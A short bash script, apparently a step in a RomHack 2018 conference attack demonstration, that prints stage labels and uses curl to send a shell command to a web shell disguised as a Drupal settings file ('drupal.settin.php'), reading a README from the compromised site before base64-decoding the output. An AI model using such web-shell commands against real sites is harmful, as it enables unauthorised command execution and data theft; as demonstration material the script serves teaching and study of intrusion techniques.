#!/bin/bash
echo "~~ RomHack 2018 ~~"
echo
echo "STAGE2 / STEP2"
echo "Read README.txt file after someone logged to Drupal"
echo "URL: http://www.org.lan/sites/default/README.txt"
echo
echo "Command executed:"
cat <<EOF
cat README.txt
EOF
echo
read pippo
echo "------"
curl -v 'http://www.org.lan/sites/default/drupal.settin.php' -d 'c=cat README.txt'
echo "------"
echo
echo "Decode now the data"
echo "echo \"XXXX\" | base64 -d"
